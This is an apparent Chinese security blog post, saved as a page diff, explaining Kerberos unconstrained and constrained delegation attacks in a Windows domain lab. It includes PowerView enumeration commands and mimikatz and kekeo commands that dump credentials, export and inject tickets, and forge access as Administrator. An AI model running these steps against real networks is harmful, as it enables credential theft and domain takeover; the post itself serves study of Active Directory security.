@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B“代理”自己去访问C服务，说是代理，也可以理解为“假冒”。 具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。 分类1. 非约束委派（Unconstrained delegation）原理即无限制">
+<meta property="og:type" content="article">
+<meta property="og:title" content="域渗透--有关委派">
+<meta property="og:url" content="https://eviladan0s.github.io/2020/04/10/kerberos-delegation/index.html">
+<meta property="og:site_name" content="白袍的小行星">
+<meta property="og:description" content="委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B“代理”自己去访问C服务，说是代理，也可以理解为“假冒”。 具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。 分类1. 非约束委派（Unconstrained delegation）原理即无限制">
+<meta property="og:locale" content="zh">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-102918@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-103553@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-103742@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-165333@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-165428@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-150940@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-151438@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200411-171112@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200413-182528@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200413-130945@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200414-111040@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200414-111449@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200414-114616@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200414-115352@2x.png">
+<meta property="og:image" content="https://eviladan0s.github.io/images/WX20200414-123021@2x.png">
+<meta property="article:published_time" content="2020-04-10T05:32:13.000Z">
+<meta property="article:modified_time" content="2020-04-14T04:35:45.899Z">
+<meta property="article:author" content="白袍">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://eviladan0s.github.io/images/WX20200411-102918@2x.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>域渗透--有关委派</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="白袍的小行星" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-atom-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/04/10/ad-ticket/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&text=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&is_video=false&description=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域渗透--有关委派&body=Check out this article: https://eviladan0s.github.io/2020/04/10/kerberos-delegation/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&name=域渗透--有关委派&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&t=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#分类"><span class="toc-number">1.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-非约束委派（Unconstrained-delegation）"><span class="toc-number">1.1.</span> <span class="toc-text">1. 非约束委派（Unconstrained delegation）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发现"><span class="toc-number">1.1.3.</span> <span class="toc-text">发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">1.1.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#另一种利用方法"><span class="toc-number">1.1.5.</span> <span class="toc-text">另一种利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-约束委派（Constrained-delegation）"><span class="toc-number">1.2.</span> <span class="toc-text">2. 约束委派（Constrained delegation）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发现-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#再谈原理"><span class="toc-number">1.2.5.</span> <span class="toc-text">再谈原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#结语"><span class="toc-number">2.</span> <span class="toc-text">结语</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+13 分钟后你将读完本篇文章.
+    
+    <h1 class="posttitle" itemprop="name headline">
+        域渗透--有关委派
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">白袍的小行星</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-10T05:32:13.000Z" itemprop="datePublished">2020-04-10</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B<strong>“代理”</strong>自己去访问C服务，说是代理，也可以理解为<strong>“假冒”</strong>。</p>
+<p>具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。</p>
+<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><h2 id="1-非约束委派（Unconstrained-delegation）"><a href="#1-非约束委派（Unconstrained-delegation）" class="headerlink" title="1. 非约束委派（Unconstrained delegation）"></a>1. 非约束委派（Unconstrained delegation）</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>即无限制的转发，B可以用从A处得到的TGT访问任意服务，其中B也可以是任意服务。</p>
+<p>流程如下：</p>
+<ol>
+<li>用户向KDC请求可转发TGT，记为TGT1</li>
+<li>KDC返回TGT1</li>
+<li>用户通过TGT1向KDC请求转发TGT2</li>
+<li>KDC返回TGT2</li>
+<li>用户通过TGT1向KDC申请访问服务1的RST</li>
+<li>KDC返回RST</li>
+<li>用户发送RST、TGT1、TGT2和TGT2的SessionKey给服务1</li>
+<li>服务1通过用户的TGT2请求KDC，以用户名义请求服务2的RST（服务访问票据）</li>
+<li>KDC给服务1返回服务2的RST</li>
+<li>服务1以用户名义向服务2发出请求</li>
+<li>服务2响应服务1的请求</li>
+<li>服务1响应用户第7步骤的请求</li>
+</ol>
+<p>这个流程有一个问题：<strong>TGT2是不被限制的，服务1完全可以用它来请求访问任何想访问的服务。</strong>攻击其实就是利用的这点，使用从高权限账户处得到的TGT去获取权限。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下面演示一下怎么利用，第一步当然是搭建环境。</p>
+<p>环境是这样：</p>
+<p><img src="/images/WX20200411-102918@2x.png" alt=""></p>
+<p>test用户为域普通用户，ttt为本地管理员，Windows 7为域内主机。</p>
+<p>liukaifeng01用户为管理员，Windows Server 2008为域管。</p>
+<p>首先将test配置为服务账号：</p>
+<pre class="line-numbers language-c"><code class="language-c">setspn <span class="token operator">-</span>U <span class="token operator">-</span>A variant<span class="token operator">/</span>golden test <span class="token comment" spellcheck="true">//配置test用户为服务账户</span>
+setspn <span class="token operator">-</span>l test <span class="token comment" spellcheck="true">//查看是否配置成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/WX20200411-103553@2x.png" alt=""></p>
+<p>再将test用户设置为非约束委派模式：</p>
+<p><img src="/images/WX20200411-103742@2x.png" alt=""></p>
+<p>然后在Windows 7上登录test用户，启动WinRM服务，这里自行百度。</p>
+<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><p>利用的第一步是发现，即我们如何知道域内哪些用户和主机开启了委派。</p>
+<p>这里使用<code>PowerSploit</code>完成，使用<code>Import-Module</code>加载<code>PowerView.ps1</code>进行查询。</p>
+<pre class="line-numbers language-php"><code class="language-php">Get<span class="token operator">-</span>NetUser <span class="token operator">-</span>Unconstrained <span class="token operator">-</span>Domain god<span class="token punctuation">.</span>org <span class="token comment" spellcheck="true">//查询配置非约束委派的账户</span>
+Get<span class="token operator">-</span>NetComputer <span class="token operator">-</span>Unconstrained <span class="token operator">-</span>Domain god<span class="token punctuation">.</span>org <span class="token comment" spellcheck="true">//查询配置非约束委派的主机</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/WX20200411-165333@2x.png" alt=""></p>
+<p><img src="/images/WX20200411-165428@2x.png" alt=""></p>
+<p>脚本需要在域控主机上运行。</p>
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>首先使用DC上的Administrator用户访问win7的WinRM服务，再在win7登录本地管理员账户，抓取出TGT。</p>
+<pre class="line-numbers language-php"><code class="language-php">mimikatz <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::tickets /export"</span> exit <span class="token comment" spellcheck="true">//导出票据</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此条即为TGT：</p>
+<p><img src="/images/WX20200411-150940@2x.png" alt=""></p>
+<p>导入票据：</p>
+<pre class="line-numbers language-php"><code class="language-php">mimikatz <span class="token string">"privilege::debug"</span> <span class="token string">"kerberos::ptt &lt;票据名称>"</span> <span class="token string">"kerberos::list"</span> exit <span class="token comment" spellcheck="true">//导入票据</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>访问域控的共享目录，发现已经可以正常访问：</p>
+<p><img src="/images/WX20200411-151438@2x.png" alt=""></p>
+<p>坑点：必须让域控的用户访问非约束委派的服务才可以得到TGT，看某篇文章写得不甚清楚，让我绕了好久。</p>
+<p>只有主机账户和服务账户可以进行委派设置，要是用服务账户就必须得用此账户启动相应的服务，然后让域控来访问此服务；主机账户我测试没有成功，只抓取到了访问文件服务（cifs）的票据，而不是TGT，具体原因不明。</p>
+<h3 id="另一种利用方法"><a href="#另一种利用方法" class="headerlink" title="另一种利用方法"></a>另一种利用方法</h3><p>如果域管主机没有和委派主机/账户产生交互，是否还能进行攻击呢？</p>
+<p>答案是可以。</p>
+<p>这种方法需要域控主机开启<code>Print Spooler</code>服务，然后攻击者主动要求域控访问委派主机以获取TGT。</p>
+<p><img src="/images/WX20200411-171112@2x.png" alt=""></p>
+<p>条件：</p>
+<ol>
+<li>主机开启<code>Print Spooler</code>服务，默认开启</li>
+<li>一台开启非受限委派的主机账户</li>
+<li>有一个域普通用户</li>
+</ol>
+<p>我们还需要两个工具：<a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a>，<a href="https://github.com/leechristensen/SpoolSample" target="_blank" rel="noopener">SpoolSample</a>，具体不演示了，因为<code>SpoolSample</code>一直崩溃，无语。</p>
+<h2 id="2-约束委派（Constrained-delegation）"><a href="#2-约束委派（Constrained-delegation）" class="headerlink" title="2. 约束委派（Constrained delegation）"></a>2. 约束委派（Constrained delegation）</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>因为非约束委派很不安全，所以微软又发布了约束委派，区别在于不会直接把TGT给服务，所发送的认证信息中包含了允许访问的服务，即不允许服务代表用户去访问其他服务。</p>
+<p>其实现主要依靠一组kerberos扩展：<code>S4U2Self</code>（Service for User to Self）和<code>S4U2Proxy</code>（Service for User to Proxy）</p>
+<p>流程如下：</p>
+<ol>
+<li>用户向服务1发出请求</li>
+<li>在此之前服务1已经得到了用户访问服务1的TGT，接下来通过S4U2self扩展模拟用户向KDC请求ST</li>
+<li>KDC返回给服务1一个用于验证服务1的ST</li>
+<li>服务1使用第三步的ST响应用户的请求</li>
+<li>用户再次向服务1发起请求，委派服务1访问服务2，条件是服务1验证通过且有有效的TGT，以及服务1有用户到服务1的可转发ST，即ST1</li>
+<li>服务1通过S4U2Proxy扩展请求KDC返回一个用于验证服务2的ST，即ST2</li>
+<li>KDC在验证PAC的数字签名后,如果没有失败（成功或没有PAC），将返回ST2给服务1</li>
+<li>服务1代表用户使用ST2请求服务2，服务2判断此用户是否经过KDC验证，依据为ST2中的cname和crealm标识</li>
+<li>服务2响应服务1的请求</li>
+<li>服务1响应用户请求</li>
+</ol>
+<h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这次多了一台计算机，所以环境如下：</p>
+<p>Windows server 2008 OWA 域控</p>
+<p>Windows server 2008 EX 服务2</p>
+<p>Windows 7 STU1 服务1</p>
+<p>将机器账户<code>STU1$</code>在域控上这样配置：</p>
+<p><img src="/images/WX20200413-182528@2x.png" alt=""></p>
+<h3 id="发现-1"><a href="#发现-1" class="headerlink" title="发现"></a>发现</h3><p>还是使用<code>PowerSploit</code>，只不过需要<code>dev</code>版而不是<code>master</code>版：</p>
+<pre class="line-numbers language-php"><code class="language-php">Get<span class="token operator">-</span>DomainUser <span class="token operator">-</span>TrustedToAuth <span class="token operator">-</span>Domain god<span class="token punctuation">.</span>org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/WX20200413-130945@2x.png" alt=""></p>
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>先抓出<code>STU1</code>主机帐户的NTLM hash，也就是<code>STU1$</code>：</p>
+<pre class="line-numbers language-php"><code class="language-php">mimikatz<span class="token punctuation">.</span>exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords full"</span> exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/WX20200414-111040@2x.png" alt=""></p>
+<p>使用<a href="https://github.com/gentilkiwi/kekeo/releases" target="_blank" rel="noopener">kekeo</a>来申请TGT：</p>
+<pre class="line-numbers language-php"><code class="language-php">tgt<span class="token punctuation">:</span><span class="token punctuation">:</span>ask <span class="token operator">/</span>user<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>账户名称</span><span class="token punctuation">></span></span></span> <span class="token operator">/</span>domain<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>域</span><span class="token punctuation">></span></span></span> <span class="token operator">/</span>ntlm<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>抓取到的哈希</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/WX20200414-111449@2x.png" alt=""></p>
+<p>通过TGT，请求一张以<code>Administrator</code>用户身份访问对应服务2（ex.god.org的cifs服务）的ST：</p>
+<pre class="line-numbers language-php"><code class="language-php">tgs<span class="token punctuation">:</span><span class="token punctuation">:</span>s4u <span class="token operator">/</span>tgt<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TGT票据名称</span><span class="token punctuation">></span></span></span> <span class="token operator">/</span>user<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>要伪造的用户</span><span class="token punctuation">></span></span></span> <span class="token operator">/</span>service<span class="token punctuation">:</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>对应的服务</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>具体格式如图：</p>
+<p><img src="/images/WX20200414-114616@2x.png" alt=""></p>
+<p>导入此ST，我们的本地管理员便可以访问<code>ex.god.org</code>的<code>cifs</code>服务了：</p>
+<p><img src="/images/WX20200414-115352@2x.png" alt=""></p>
+<h3 id="再谈原理"><a href="#再谈原理" class="headerlink" title="再谈原理"></a>再谈原理</h3><p>我们提到约束委派基于<code>S4U2Self</code>（Service for User to Self）和<code>S4U2Proxy</code>（Service for User to Proxy）这两个扩展，那么它们分别在此过程中起了什么作用呢？</p>
+<p><code>S4U2Self</code>扩展在第二步使用，模拟用户请求了KDC，实际上是代表了用户，让KDC验证用户是否</p>
+<p>合法，而<code>S4U2Proxy</code>则是让服务1以用户身份只能通过ST1获取到ST2，禁止服务1直接去访问其他服务。</p>
+<p>我们再来看看本次利用中的票据详情：</p>
+<p><img src="/images/WX20200414-123021@2x.png" alt=""></p>
+<p>票据标志里有了<code>forwardable</code>字段，如果没有此字段的票据是无法转发的。</p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>有关Kerberos委派的相关暂且写到这里，本来还想写资源约束委派的，但是手头上没有<code>Windows server 2012</code>的环境，都是2008的，所以还是先搁置下来了，有时间补上。</p>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#分类"><span class="toc-number">1.</span> <span class="toc-text">分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-非约束委派（Unconstrained-delegation）"><span class="toc-number">1.1.</span> <span class="toc-text">1. 非约束委派（Unconstrained delegation）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">1.1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发现"><span class="toc-number">1.1.3.</span> <span class="toc-text">发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用"><span class="toc-number">1.1.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#另一种利用方法"><span class="toc-number">1.1.5.</span> <span class="toc-text">另一种利用方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-约束委派（Constrained-delegation）"><span class="toc-number">1.2.</span> <span class="toc-text">2. 约束委派（Constrained delegation）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#发现-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#再谈原理"><span class="toc-number">1.2.5.</span> <span class="toc-text">再谈原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#结语"><span class="toc-number">2.</span> <span class="toc-text">结语</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&text=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&is_video=false&description=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=域渗透--有关委派&body=Check out this article: https://eviladan0s.github.io/2020/04/10/kerberos-delegation/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&title=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&name=域渗透--有关委派&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://eviladan0s.github.io/2020/04/10/kerberos-delegation/&t=域渗透--有关委派" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 白袍
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="https://github.com/evilAdan0s" target="_blank" rel="noopener">Projects</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
